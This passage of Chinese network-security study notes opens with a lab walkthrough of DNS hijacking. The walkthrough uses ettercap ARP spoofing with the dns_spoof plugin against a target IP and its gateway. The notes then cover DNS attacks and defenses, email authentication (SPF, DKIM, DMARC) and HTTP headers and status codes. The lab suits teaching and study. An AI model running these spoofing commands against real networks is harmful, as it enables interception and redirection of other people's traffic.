 ettercap -i eth0 -Tq -M arp:remote -P dns_spoof /被攻击者ip// /被攻击者网关// 
 -i：网卡
 -T：文本模式
 -q：安静模式
 -M：执行mitm攻击
 -P：plugin 开始该插件
```

靶机访问以下网站确认环境正常

```
http://www.mashibing.com/
http://m.ctrip.com
http://www.jd.com/
```

```
ping www.mashibing.com
ping m.ctrip.com
ping www.jd.com
```

执行劫持命令

```
ettercap -i eth0 -Tq -M arp:remote -P dns_spoof /192.168.40.102// /192.168.40.1// >b.txt
```

分析日志

```
tail -f b.txt
或者
tail -f b.txt | grep "dns_spoof"
```

靶机访问以下网站查看攻击效果

```
http://www.mashibing.com/
http://m.ctrip.com
http://www.jd.com/
```

```
ping www.mashibing.com
```

停止劫持

```
Ctrl+C
```

恢复dns劫持，刷新dns缓存即可。

```
ipconfig /flushdns
```

靶机访问以下网站查看环境是否恢复正常

```
http://www.mashibing.com/
http://m.ctrip.com
http://www.jd.com/
```

```
ping www.mashibing.com
```

恢复kali环境：

- 进入配置文件位置

```
cd /etc/ettercap
```

- 复制dns文件到新文件

```
cp etter.dns etter.dns2
```

- 还原dns配置文件

```
cp etter.dns1 etter.dns
```

##### DNS欺骗

通过浏览器访问网站的流程概述

1. 解析URL，找到域名
2. 查询浏览器DNS缓存
3. 查询本地hosts文件
4. 查询本地域名服务器
5. 等待本地域名服务器返回即可

DNS欺骗的相关案例操作：[DNS欺骗](https://blog.csdn.net/lady_killer9/article/details/110562045)

##### 拒绝服务

DNS服务通常会开启UDP端口，当DNS服务器拥有大量二级域NS记录时，通过DNS的UDP反射攻击可以实现高倍的拒绝服务。

##### DNS防范

- 在客户端直接使用IP Address访问重要的站点，从而避免DNS欺骗;
- 限制动态更新；
- 对DNS Server和Client的数据流进行加密；

#### 2.6.2.10 参考

《TCP/IP详解I》第十四章

《计算机网络（谢希仁）第七版》6.1

##### RFC

-   [RFC 1034 DOMAIN NAMES CONCEPTS AND FACILITIES](https://tools.ietf.org/html/rfc1034)
-   [RFC 1035 DOMAIN NAMES IMPLEMENTATION AND SPECIFICATION](https://tools.ietf.org/html/rfc1035)
-   [RFC 1123 Requirements for Internet Hosts -- Application and Support](https://tools.ietf.org/html/rfc1123)
-   [RFC 2535 Domain Name System Security Extensions](https://tools.ietf.org/html/rfc2535)
-   [RFC2870](https://www.rfc-editor.org/info/rfc2870)
-   [RFC 2930 Secret Key Establishment for DNS (TKEY RR)](https://tools.ietf.org/html/rfc2930)
-   [RFC 2931 DNS Request and Transaction Signatures ( SIG(0)s )](https://tools.ietf.org/html/rfc2931)
-   [RFC 3596 Legacy Resolver Compatibility for Delegation Signer (DS)](https://tools.ietf.org/html/rfc3596)
-   [RFC 3755 DNS Extensions to Support IP Version 6](https://tools.ietf.org/html/rfc3755)
-   [RFC 5001 Automated Updates of DNS Security (DNSSEC) Trust Anchors](https://tools.ietf.org/html/rfc5001)
-   [RFC 5936 DNS Zone Transfer Protocol](https://tools.ietf.org/html/rfc5936)
-   [RFC 5966 DNS Transport over TCP - Implementation Requirements](https://tools.ietf.org/html/rfc5966)
-   [RFC 6376 DomainKeys Identified Mail (DKIM) Signatures](https://tools.ietf.org/html/rfc6376)
-   [RFC 6762 Multicast DNS](https://tools.ietf.org/html/rfc6762)
-   [RFC 6891 Extension Mechanisms for DNS (EDNS(0))](https://tools.ietf.org/html/rfc6891)
-   [RFC 6895 DNS IANA Considerations](https://tools.ietf.org/html/rfc6895)
-   [RFC 7766 DNS Transport over TCP - Implementation Requirements](https://tools.ietf.org/html/rfc7766)
-   [RFC 7858 Specification for DNS over Transport Layer Security (TLS)](https://tools.ietf.org/html/rfc7858)
-   [RFC 8082 NXDOMAIN](https://tools.ietf.org/html/rfc8082)
-   [RFC 8482 Providing Minimal-Sized Responses to DNS Queries That Have QTYPE=ANY](https://tools.ietf.org/html/rfc8482)
-   [RFC 8484 DNS Queries over HTTPS (DoH)](https://tools.ietf.org/html/rfc8484)
-   [RFC 8490 DNS Stateful Operations](https://tools.ietf.org/html/rfc8490)
-   [RFC 8499 DNS Terminology](https://tools.ietf.org/html/rfc8499)

##### 工具

-   [Unbound](https://github.com/NLnetLabs/unbound)

-   [bind9](https://github.com/isc-projects/bind9)

##### 研究文章

-   [DGA域名的今生前世：缘起、检测、与发展](https://mp.weixin.qq.com/s/xbf0Qbppk8R0nx89Pb4YTg)

-   [DNSSEC原理和分析](https://blog.thecjw.me/?p=1221)

-   Plohmann D, Yakdan K, Klatt M, et al. A comprehensive measurement study of domain generating malware\[C\]//25th {USENIX} Security Symposium ({USENIX} Security 16). 2016: 263-278.

-   An End-to-End Large-Scale Measurement of DNS-over-Encryption: How Far Have We Come?

##### 相关CVE

-   [SIGRed -- Resolving Your Way into Domain Admin: Exploiting a 17 Year-old Bug in Windows DNS](https://research.checkpoint.com/2020/resolving-your-way-into-domain-admin-exploiting-a-17-year-old-bug-in-windows-dns-servers/) [Servers](https://research.checkpoint.com/2020/resolving-your-way-into-domain-admin-exploiting-a-17-year-old-bug-in-windows-dns-servers/)

### 2.6.3 电子邮件

#### 2.6.3.1 邮件协议族

##### SMTP

**简单邮件传输协议**SMTP (Simple Mail Transfer Protocol) 是一种电子邮件传输的协议，是一组用于从源地址到目的地址传输邮件的规范。不启用SSL时端口号为25，启用SSL时端口号多为465或994。

##### POP3

POP3 (Post Office Protocol 3，第三版邮局协议) 用于支持使用客户端远程管理在服务器上的电子邮件。不启用SSL时端口号为110，启用SSL时端口号多为995。

##### IMAP

IMAP (Internet Mail Access Protocol，Internet邮件访问协议)，即交互式邮件存取协议，它是跟 POP3 类似邮件访问标准协议之一。不同的是，开启了 IMAP 后，您在电子邮件客户端收取的邮件仍然保留在服务器上，同时在客户端上的操作都会反馈到服务器上，如：删除邮件，标记已读等，服务器上的邮件也会做相应的动作。不启用 SSL 时端口号为 143，启用 SSL 时端口号多为 993。

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220604174959111.png" alt="image-20220604174959111" style="zoom:50%;" />

#### 2.6.3.2 Webmail

Webmail——基于Web的电子邮件

- 提供电子邮件服务的IMAP和SMTP替代方案
- 使用Web作为界面，用户代理就是普通的浏览器
- 用户及其远程邮箱之间的通信通过HTTP进行

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220604175111254.png" alt="image-20220604175111254" style="zoom:50%;" />

#### 2.6.3.2 防护策略

##### SPF

发件人策略框架 (Sender Policy Framework, SPF) 是一套电子邮件认证机制，用于确认电子邮件是否由网域授权的邮件服务器寄出，防止有人伪冒身份网络钓鱼或寄出垃圾邮件。SPF 允许管理员设定一个 DNS TXT记录或 SPF 记录设定发送邮件服务器的 IP 范围，如有任何邮件并非从上述指明授权的 IP 地址寄出，则很可能该邮件并非确实由真正的寄件者寄出。

##### DKIM

域名密钥识别邮件 (DomainKeys Identified Mail, DKIM) 是一种检测电子邮件发件人地址伪造的方法。发送方会在邮件的头中插入 DKIM-Signature，收件方通过查询 DNS 记录中的公钥来验证发件人的信息。

##### DMARC

基于网域的消息认证、报告和一致性 (Domain-based Message Authentication, Reporting and Conformance, DMARC) 是电子邮件身份验证协议，用于解决在邮件栏中显示的域名和验证的域名不一致的问题。要通过 DMARC 检查，必须通过 SPF 或/和 DKIM 的身份验证， 需要标头地址中的域名必须与经过身份验证的域名一致。

#### 2.6.3.3 参考链接

##### RFC

-   [RFC 4408 Sender Policy Framework (SPF) for Authorizing Use of Domains in E-Mail, Version 1](https://tools.ietf.org/html/rfc4408)

-   [RFC 6376 DomainKeys Identified Mail (DKIM) Signatures](https://tools.ietf.org/html/rfc6376)

-   [RFC 7208 Sender Policy Framework (SPF) for Authorizing Use of Domains in Email, Version 1](https://tools.ietf.org/html/rfc7208)

-   [RFC 7489 Domain-based Message Authentication, Reporting, and Conformance (DMARC)](https://tools.ietf.org/html/rfc7489)

-   [RFC 8301 Cryptographic Algorithm and Key Usage Update to DomainKeys Identified Mail (DKIM)](https://tools.ietf.org/html/rfc8301)

-   [RFC 8463 A New Cryptographic Signature Method for DomainKeys Identified Mail (DKIM)](https://tools.ietf.org/html/rfc8463)

-   [RFC 8616 Email Authentication for Internationalized Mail](https://tools.ietf.org/html/rfc8616)

-   [RFC 8611 Mail](https://tools.ietf.org/html/rfc8611)

##### 相关文档

-   [Sender Policy Framework wikipedia](https://en.wikipedia.org/wiki/Sender_Policy_Framework)

-   [DomainKeys Identified Mail wikipedia](https://en.wikipedia.org/wiki/DomainKeys_Identified_Mail)

-   [DMARC wikipedia](https://en.wikipedia.org/wiki/DMARC)

##### 研究文章

-   [Composition Kills:A Case Study of Email Sender Authentication](http://i.blackhat.com/USA-20/Thursday/us-20-Chen-You-Have-No-Idea-Who-Sent-That-Email-18-Attacks-On-Email-Sender-Authentication-wp.pdf)



-   ](https://en.wikipedia.org/wiki/Transport_Layer_Security)

### 2.6.4 WWW

#### 2.6.4.1 WWW体系结构与协议

WWW=World Wide Web=万维网

HTTP服务器和客户端，以及它们之间执行的HTTP协议

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220604175317975.png" alt="image-20220604175317975" style="zoom: 33%;" />

**服务器**

- Web页面（HTML文档）：包含多种对象或链接
- Web对象（包括：静态对象和动态对象）：可以是 HTML文档、 图像文件、视频文件、声音文件、脚本文件等
- 对象用URL（统一资源定位符）编址：协议类型://主机名:端口//路径和文件名

**客户端**

- 发出请求、接收响应、解释HTML文档并显示
- 有些对象需要浏览器安装插件

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220604175428977.png" alt="image-20220604175428977" style="zoom:33%;" />

**WWW协议**

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220604175519609.png" alt="image-20220604175519609" style="zoom:50%;" />



### 2.6.5  HTTP协议簇

#### 2.6.5.1  HTTP

##### HTTP协议简介

HTTP协议是Hyper Text Transfer Protocol（超文本传输协议）的缩写,是用于从万维网（WWW:World Wide Web ）服务器传输超文本到本地浏览器的传送协议，是一个基于TCP/IP通信协议来传递数据（HTML文件, 图片文件, 查询结果等）。

##### HTTP版本

**HTTP 0.9**

HTTP 0.9仅支持GET命令，请求格式只有简单的 GET /url ，服务端仅响应 HTML，响应完毕后关闭 TCP 连接。

**HTTP 1.0**

HTTP/1.0 版本引入了 POST、HEAD 两个动词。从 1.0开始，必须在尾部添加协议版本。在 1.0 中，也引入了状态码 (status code)、多字符集支持、多部分发送 (multi-part type)、权限 (authorization)、缓存 (cache)、内容编码 (content encoding) 等内容。

HTTP 1.0 版的**主要缺点**是，每个 TCP 连接只能发送一个请求。发送数据完毕，连接就关闭，如果还要请求其他资源，就必须再新建一个连接。

TCP 连接的新建成本很高，因为需要客户端和服务器三次握手，开始时发送速率较慢 (slow start)，所以，HTTP 1.0 版本的性能比较差。

**HTTP 1.1**

HTTP/1.1版本进一步完善了HTTP协议。1.1版本主要是引入了持久连接、管道机制、Content-Length、分块传输编码等内容。管道机制即在同一个TCP连接里面，客户端可以同时发送多个请求，这样就改进了HTTP协议的效率。PUT、PATCH、HEAD、OPTIONS、DELETE等动词方法也是在HTTP 1.1版本引入的。另外1.1版本新增了Host字段，用于指定服务器的域名，这也是后来虚拟主机得以发展的基础。

虽然1.1版允许复用TCP连接，但是同一个TCP连接里面，所有的数据通信是按次序进行的。服务器只有处理完一个回应，才会进行下一个回应。如果有一个请求很慢，就会阻塞后面的请求。

**SPDY**

2009 年，谷歌公开了自行研发的 SPDY 协议，用于解决 HTTP/1.1 效率不高的问题，而后被当做 HTTP/2的基础。

**HTTP/2**

HTTP/2 是一个二进制协议，头信息和数据体都是二进制，统称为**帧 (frame)**，帧分为头信息帧和数据帧。HTTP/2 复用 TCP 连接，在一个连接里，客户端和浏览器都可以同时发送多个请求或回应，而不用按照顺序回应。

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220604181227447.png" alt="image-20220604181227447" style="zoom:33%;" />

##### HTTP连接的两种类型

**1.非持久性连接（Nonpersistent HTTP）**

- 每个TCP连接最多允许传输一个对象
- HTTP 1.0版本使用非持久性连接

**2.持久性连接（Persistent HTTP）**

- 每个TCP连接允许传输多个对象
- HTTP 1.1版本默认使用持久性连接

##### HTTP工作原理

HTTP协议工作于C/S（客户端-服务端）架构上。浏览器作为HTTP客户端通过URL向HTTP服务端即WEB服务器发送所有请求。

Web服务器有：Nginx服务器，Apache服务器，IIS服务器（Internet Information Services）等。

Web服务器根据接收到的请求后，向客户端发送响应信息。

HTTP默认端口号为80，你也可以改为8080或者其他端口，HTTPS默认端口号为443。

##### HTTP注意事项

- **HTTP是无连接**：无连接指限制每次连接只处理一个请求。服务器处理完客户的请求，并收到客户的应答后，即断开连接。
- **HTTP是媒体独立的**：只要客户端和服务器知道如何处理的数据内容，任何类型的数据都可以通过HTTP发送。客户端以及服务器指定使用适合的MIME-type内容类型。
- **HTTP是无状态**：HTTP协议是无状态协议。无状态指协议对于事务处理没有记忆能力。缺少状态意味着如果后续处理需要前面的信息，则它必须重传，这样可能导致每次连接传送的数据量增大。另一方面，在服务器不需要先前信息时它的应答就较快。

HTTP协议通信流程图：

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220508173339825.png" alt="image-20220508173339825" style="zoom: 50%;" />

##### HTTP消息结构 

HTTP使用统一资源标识符（Uniform Resource Identifiers, URI）来传输数据和建立连接。一旦建立连接后，数据消息就通过类似Internet邮件所使用的格式[RFC5322]和多用途Internet邮件扩展（MIME）[RFC2045]来传送。

##### 客户端请求消息

客户端发送一个HTTP请求到服务器的请求消息包括以下格式：请求行（request line）、请求头部（header）、空行和请求数据四个部分组成。

请求报文的一般格式图：

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220508173554176.png" alt="image-20220508173554176" style="zoom:67%;" />

![image-20220508173719525](C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220508173719525.png)

注意：在http请求报文中，GET之后是有一个空格的

```html
<method><request-URL><version>
<headers>
<entity-body>
</entity-body>
```

##### 服务器响应消息 

HTTP响应也由四个部分组成，分别是：状态行、消息报头、空行和响应正文。

响应报文格式：

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220508173934571.png" alt="image-20220508173934571" style="zoom:50%;" />

```html
<version><status><reason-phrase>
<headers>
<entity-body>
```

##### 实例（用Python代码来实现）：

```python
import urllib.request
url = "http://httpbin.org/get"
print(url)
# 添加请求的url和方法
req = urllib.request.Request(url, method="GET")
# 接收响应数据
returnData = urllib.request.urlopen(req)
res_json = returnData.read().decode('utf-8')
print(res_json)
```

<img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220508175357317.png" alt="image-20220508175357317" style="zoom: 50%;" />

##### 字段解释

**1.method（请求方法）**

- HTTP 1.0 定义了三种请求方法： GET, POST 和 HEAD方法。

- HTTP 1.1 新增了六种请求方法：OPTIONS、PUT、PATCH、DELETE、TRACE 和 CONNECT 方法。

  | 序号 | 方法    | 用途                                                         |
  | ---- | ------- | ------------------------------------------------------------ |
  | 1    | GET     | 请求指定的页面信息，并返回实体主体。                         |
  | 2    | HEAD    | 类似于 GET 请求，只不过返回的响应中没有具体的内容，用于获取报头 |
  | 3    | POST    | 向指定资源提交数据进行处理请求（例如，提交表单或者上传文件）。数据被包含在请求体中。POST 请求可能会导致新的资源的建立或已有资源的修改。 |
  | 4    | PUT     | 从客户端向服务器传送的数据取代指定的文档的内容。             |
  | 5    | DELETE  | 请求服务器删除指定的页面。                                   |
  | 6    | CONNECT | HTTP/1.1 协议中预留给能够将连接改为管道方式的代理服务器。    |
  | 7    | OPTIONS | 允许客户端查看服务器的性能。                                 |
  | 8    | TRACE   | 回显服务器收到的请求，主要用于测试或诊断。                   |
  | 9    | PATCH   | 是对 PUT 方法的补充，用来对已知资源进行局部更新 。           |

- GET和POST的区别
  - GET在浏览器回退时是无害的，而POST会再次提交请求。
  - GET产生的URL地址可以被Bookmark，而POST不可以。
  - GET请求会被浏览器主动cache，而POST不会，除非手动设置。
  - GET请求只能进行url编码，而POST支持多种编码方式。
  - GET请求参数会被完整保留在浏览器历史记录里，而POST中的参数不会被保留。
  - GET请求在URL中传送的参数是有长度限制的，而POST没有。
  - 对参数的数据类型，GET只接受ASCII字符，而POST没有限制。
  - GET比POST更不安全，因为参数直接暴露在URL上，所以不能用来传递敏感信息。
  - GET参数通过URL传递，POST放在Request body中。

HTTP的底层是TCP/IP（推荐书籍《TCP/IP详解》）。所以，GET和POST的底层也是TCP/IP。GET和POST能做的事情是一样一样的。如果给GET加上request body，或者给POST带上url参数，技术上是完全行的通的。也就是说，**GET和POST在本质上没什么区别**。

但是如果真的一点区别都没有，那么这个问题也就不存在了，两者之间最重大的区别就是：**GET产生一个TCP数据包；POST产生两个TCP数据包。**
具体点说来就是：对于GET方式的请求，浏览器会把http header和data一并发送出去，服务器响应200（返回数据）；而对于POST，浏览器先发送header，服务器响应100 continue，浏览器再发送data，服务器响应200 ok（返回数据）。

get: [RFC 2616 - Hypertext Transfer Protocol -- HTTP/1.1](http://tools.ietf.org/html/rfc2616#section-9.3) 

post: [RFC 2616 - Hypertext Transfer Protocol -- HTTP/1.1](http://tools.ietf.org/html/rfc2616#section-9.5)

**2.version**

-   报文使用的 HTTP 版本

-   格式为 HTTP/\<major\>.\<minor\>

**3.url（Uniform Resource Locator, 统一资源定位符）**

```
<scheme>://<user>:<password>@<host>:<port>/<path>;<params>?<query>#<frag>
[协议类型]://[用户名[:密码]]@[服务器地址]:[端口号]/[资源层级UNIX文件路径][文件名]?[查询]#[片段ID]
```

- ```
  -协议类型：常见的有http、https，还有ftp、file、mailto、data等。
  -用户名、密码：这没什么好解释的，就是字面意思。
  -服务器地址：有的时候你在URL上看到的是域名，其实会通过DNS转为IP地址，所以还是服务器IP地址。
  -端口号：常见80、443、21、22等。
  -资源层级文件路径：大部分会隐藏，就是服务器的目录路径，使用"/"区别每一层。
  -文件名：如访问网页，可能是xxx.htm、xxx.html、xxx.php等，例如，index.html。
  -查询：使用"&"连接
  -片段ID：有的时候被称为“锚点”，一般是指CSS中的id，就是使用浏览器调试时看到的id属性，有时也可通过这个进行XSS或sql注入。
  ```

- 其中[用户名[：密码]]、[端口号]、[查询]、[片段ID]都属于选填项。

##### 请求头列表

- **Accept**
  - 指定客户端能够接收的内容类型
  
  - Accept: text/plain, text/html
  
- **Accept-Charset**

  - 浏览器可以接受的字符编码集

  - Accept-Charset: iso-8859-5

- **Accept-Encoding**

  - 指定浏览器可以支持的 web 服务器返回内容压缩编码类型

  - Accept-Encoding: compress, gzip

- **Accept-Language**

  - 浏览器可接受的语言

  - Accept-Language: en,zh

- **Accept-Ranges**

  - 可以请求网页实体的一个或者多个子范围字段

  - Accept-Ranges: bytes

- **Authorization**

  - HTTP 授权的授权证书

  - Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==

- **Cache-Control**

  - 指定请求和响应遵循的缓存机制
  -  Cache-Control: no-cache

- **Connection**

  - 表示是否需要持久连接 // HTTP 1.1 默认进行持久连接

  - Connection: close

- **Cookie**

  - HTTP 请求发送时，会把保存在该请求域名下的所有 cookie 值一起发送给 web 服务器

  - Cookie: role=admin;ssid=1

- **Content-Length**

  - 请求的内容长度

  - Content-Length: 348

- **Content-Type**

  - 请求的与实体对应的 MIME 信息

  - Content-Type: application/x-www-form-urlencoded

-   **Date**
    - &nbsp;请求发送的日期和时间
    -  Date: Tue, 15 Nov 2010 08:12:31 GMT

- **Expect**

  - 请求的特定的服务器行为

  - Expect: 100-continue

-   **From**
    - 发出请求的用户的 Email
    - From: <user@email.com>

- **Host**
  - 指定请求的服务器的域名和端口号
  - Host: [www.github.com](http://www.github.com/)
  
-   **If-Match**
    - 只有请求内容与实体相匹配才有效
    - If-Match: "737060cd8c284d8af7ad3082f209582d"

-   **If-Modified-Since**
    -   如果请求的部分在指定时间之后被修改则请求成功，未被修改则返回304代码
    
    -   If-Modified-Since: Sat, 29 Oct 2018 19:43:31 GMT
-   **If-None-Match**
    - 如果内容未改变返回 304 代码，参数为服务器先前发送的 Etag，与服务器回应的 Etag 比较判断是否改
    - If-None-Match: "737060cd8c284d8af7ad3082f209582d"

-   **If-Range**
    - 如果实体未改变，服务器发送客户端丢失的部分，否则发送整个实体。参数也为 Etag
    - If-Range: "737060cd8c284d8af7ad3082f209582d"

- **If-Unmodified-Since**

  - 只在实体在指定时间之后未被修改才请求成功

  - If-Unmodified-Since: Sat, 29 Oct 2010 19:43:31 GMT

- **Max-Forwards**

  - 限制信息通过代理和网关传送的时间

  - Max-Forwards: 10

- **Pragma**

  - 用来包含实现特定的指令

  - Pragma: no-cache

- **Proxy-Authorization**

  - 连接到代理的授权证书

  - Proxy-Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==

- **Range**

  - 只请求实体的一部分，指定范围

  - Range: bytes=500-999

- **Referer**

  - 先前网页的地址，当前请求网页紧随其后, 即来路

  - Referer: <http://www.zcmhi.com/archives/71.html>

-   **TE**
    - 客户端愿意接受的传输编码，并通知服务器接受接受尾加头信息
    - TE: trailers,deflate;q=0.5

-   **Upgrade**
    -   向服务器指定某种传输协议以便服务器进行转换（如果支持）
    
    -   Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11
    
-   **User-Agent**
    
    -   User-Agent 的内容包含发出请求的用户信息
    
    -   User-Agent: Mozilla/5.0 (Linux; X11)
    
-   **Via**
    -   通知中间网关或代理服务器地址，通信协议
    
    -   Via: 1.0 fred, 1.1 nowhere.com (Apache/1.1)
    
- **Warning**

  - 关于消息实体的警告信息

  - Warn: 199 Miscellaneous warning

##### 响应头列表

- **Accept-Ranges**

  - 表明服务器是否支持指定范围请求及哪种类型的分段请求

  - Accept-Ranges: bytes

- **Access-Control-Allow-Origin**

  - 配置有权限访问资源的域

  - Access-Control-Allow-Origin: \<origin\>\|\*

-   **Age**
    -   从原始服务器到代理缓存形成的估算时间（以秒计，非负）

    -   Age: 12
    
-   **Allow**
    -   服务器支持哪些请求方法（如GET、POST等），不允许则返回 405

    -   Allow: GET, HEAD

-   **Cache-Control**

    -   告诉所有的缓存机制是否可以缓存及哪种类型

    -   Cache-Control: no-cache

- **Content-Encoding**

  -   web 服务器支持的返回内容压缩编码类型。文档的编码（Encode）方法。只有在解码之后才可以得到Content-Type头指定的内容类型。利用gzip压缩文档能够显著地减少HTML文档的下载时间。Java的GZIPOutputStream可以很方便地进行gzip压缩，但只有Unix上的Netscape和Windows上的IE 4、IE 5才支持它。因此，Servlet应该通过查看Accept-Encoding头（即request.getHeader("Accept-Encoding")）检查浏览器是否支持gzip，为支持gzip的浏览器返回经gzip压缩的HTML页面，为其他浏览器返回普通页面。
  -   Content-Encoding: gzip

-   **Content-Language**

    -   响应体的语言

    -   Content-Language: en,zh

- ##### **Content-Length**

  -   响应体内容长度。只有当浏览器使用持久HTTP连接时才需要这个数据。如果你想要利用持久连接的优势，可以把输出文档写入 ByteArrayOutputStream，完成后查看其大小，然后把该值放入Content-Length头，最后通过byteArrayStream.writeTo(response.getOutputStream()发送内容。
  -   Content-Length: 348

-   **Content-Location**

    -   请求资源可替代的备用的另一地址

    -   Content-Location: /index.htm

-   **Content-MD5**

    -   返回资源的 MD5 校验值

    -   Content-MD5: Q2hlY2sgSW50ZWdyaXR5IQ==

-   **Content-Range**

    -   在整个返回体中本部分的字节位置
    -   Content-Range: bytes 21010-47021/47022

- **Content-Type**

  - 返回内容的 MIME 类型，表示后面的文档属于什么MIME类型。Servlet默认为text/plain，但通常需要显式地指定为text/html。由于经常要设置Content-Type，因此HttpServletResponse提供了一个专用的方法setContentType。

  - Content-Type: text/html; charset=utf-8

-   **Date**
    -   当前的GMT时间（原始服务器消息发出的时间）。你可以用setDateHeader来设置这个头以避免转换时间格式的麻烦。
    -   Date: Tue, 15 Nov 2010 08:12:31 GMT
    
-   **ETag**
    -   请求变量的实体标签的当前值
    -   ETag: "737060cd8c284d8af7ad3082f209582d"

-   **Expires**

    -   响应过期的日期和时间（应该在什么时候认为文档已经过期，从而不再缓存它？）

    -   Expires: Thu, 01 Dec 2010 16:00:00 GMT

-   **Last-Modified**

    -   请求资源的最后修改时间（文档的最后改动时间）。客户可以通过If-Modified-Since请求头提供一个日期，该请求将被视为一个条件GET，只有改动时间迟于指定时间的文档才会返回，否则返回一个304（Not Modified）状态。Last-Modified也可用setDateHeader方法来设置。

    -   Last-Modified: Tue, 15 Nov 2010 12:45:26 GMT

-   **Location**

    -   重定向接收方到非请求 URL 的位置来完成请求或标识新的资源，表示客户应当到哪里去提取文档。Location通常不是直接设置的，而是通过HttpServletResponse的sendRedirect方法，该方法同时设置状态代码为302。

    -   Location: <http://www.zcmhi.com/archives/94.html>

-   **Pragma**

    -   包括实现特定的指令，它可应用到响应链上的任何接收方

    -   Pragma: no-cache

-   **Proxy-Authenticate**

    -   它指出认证方案和可应用到代理的该 URL 上的参数

    -   Proxy-Authenticate: Basic

- **Refresh**

  -   表示浏览器应该在多少时间之后刷新文档，以秒计。除了刷新当前文档之外，你还可以通过setHeader("Refresh", "5; URL=http://host/path")让浏览器读取指定的页面。
  -   注意这种功能通常是通过设置HTML页面HEAD区的＜META HTTP-EQUIV="Refresh" CONTENT="5;URL=http://host/path"＞实现，这是因为，自动刷新或重定向对于那些不能使用CGI或Servlet的HTML编写者十分重要。但是，对于Servlet来说，直接设置Refresh头更加方便。
  -   注意Refresh的意义是"N秒之后刷新本页面或访问指定页面"，而不是"每隔N秒刷新本页面或访问指定页面"。因此，连续刷新要求每次都发送一个Refresh头，而发送204状态代码则可以阻止浏览器继续刷新，不管是使用Refresh头还是＜META HTTP-EQUIV="Refresh" ...＞。
  -   注意Refresh头不属于HTTP 1.1正式规范的一部分，而是一个扩展，但Netscape和IE都支持它。
  -   Refresh: 5; url=[http://www.zcmhi.com/archives/94.html](http://www.zcmhi.com/archives/94.html)

-   **Retry-After**

    -   如果实体暂时不可取，通知客户端在指定时间之后再次尝试

    -   Retry-After: 120

-   **Server**

    -   web 服务器软件名称。Servlet一般不设置这个值，而是由Web服务器自己设置。

    -   Server: Apache/1.3.27 (Unix) (Red-Hat/Linux)

- **Set-Cookie**

  -   设置和页面关联的Cookie。Servlet不应使用response.setHeader("Set-Cookie", ...)，而是应使用HttpServletResponse提供的专用方法addCookie。参见下文有关Cookie设置的讨论。
  -   设置 Http Cookie Set-Cookie: UserID=JohnDoe; Max-Age=3600; Version=1

-   **Strict-Transport-Security**

    -   设置浏览器强制使用 HTTPS 访问

    -   max-age: x 秒的时间内访问对应域名都使用 HTTPS 请求

    -   includeSubDomains: 网站的子域名也启用规则

    -   Strict-Transport-Security: max-age=1000; includeSubDomains

-   **Trailer**

    -   指出头域在分块传输编码的尾部存在 Trailer: Max-Forwards

-   **Transfer-Encoding**

    -   文件传输编码

    -   Transfer-Encoding:chunked

- **Vary**

  - 告诉下游代理是使用缓存响应还是从原始服务器请求

  - Vary: \\*

- **Via**

  - 告知代理客户端响应是通过哪里发送的

  - Via: 1.0 fred, 1.1 nowhere.com (Apache/1.1)

-  **Warning**

  -  警告实体可能存在的问题

  -  Warning: 199 Miscellaneous warning

- **WWW-Authenticate**

  - 表明客户端请求实体应该使用的授权方案，客户应该在Authorization头中提供什么类型的授权信息。在包含401（Unauthorized）状态行的应答中这个头是必需的。例如，response.setHeader("WWW-Authenticate", "BASIC realm=＼"executives＼"")。
  - 注意Servlet一般不进行这方面的处理，而是让Web服务器的专门机制来控制受密码保护页面的访问（例如.htaccess）
  - WWW-Authenticate: Basic

- ##### X-Content-Type-Options
  
  - 配置禁止 MIME 类型嗅探
  - X-Content-Type-Options: nosniff
  
- **X-Frame-Options**
  
  - 配置页面是否能出现在 \<frame\>, \<iframe\>, \<embed\>, \<object\> 等标签中，防止点击劫持
  - **1. DENY**
    表示该页面不允许在iframe中展示，即便是在相同域名的页面中嵌套也不允许。nginx配置示例：add_header X-Frame-Options DENY;
  - **2. SAMEORIGIN**
    表示该页面可以在相同域名页面的frame中展示。nginx配置示例：add_header X-Frame-Options SAMEORIGIN;
  - **3. ALLOW-FROM url** 
    表示该页面可以在指定来源的frame中展示。nginx配置示例：add_header X-Frame-Options 'ALLOW-FROM https://xxx.xxxxxx.com';
  - **4. ALLOWALL**
    表示该页面允许全部来源域名的frame展示。nginx配置示例：add_header X-Frame-Options ALLOWALL;
  - X-Frame-Options: deny
  
- **X-XSS-Protection**
  
  - 配置 XSS 防护机制
  - X-XSS-Protection: 1; mode=block

##### HTTP状态返回代码 1xx（临时响应）

表示临时响应并需要请求者继续执行操作的状态代码。

> | Code | 代码                            | 说明                                                         |
>| :--: | ------------------------------- | ------------------------------------------------------------ |
> | 100  | 继续（Coutinue）                | 服务器返回此代码表示已收到请求的第一部分，正在等待其余部分，[客户端](http://www.dreamdu.com/webbuild/client_vs_server/)应继续其请求 |
> | 101  | 切换协议（Switching Protocols） | 请求者已要求服务器切换协议，服务器已确认并准备切换           |
> 

##### HTTP状态返回代码 2xx （成功）

操作被成功接收并处理

| Code | 代码                                        | 说明                                                         |
| :--: | ------------------------------------------- | ------------------------------------------------------------ |
| 200  | 成功（OK）                                  | 服务器已成功处理了请求。通常，这表示服务器提供了请求的网页   |
| 201  | 已创建（Created）                           | 请求成功并创建了新的资源                                     |
| 202  | 已接受（Accepted）                          | 服务器已接受请求，但尚未处理完成                             |
| 203  | 非授权信息（Non-Authoritative Information） | 服务器已成功处理了请求，但返回的meta信息不在原始的服务器，而是一个副本 |
| 204  | 无内容（No Content）                        | 服务器成功处理了请求，但没有返回任何内容。在未更新网页的情况下，可确保浏览器继续显示当前文档 |
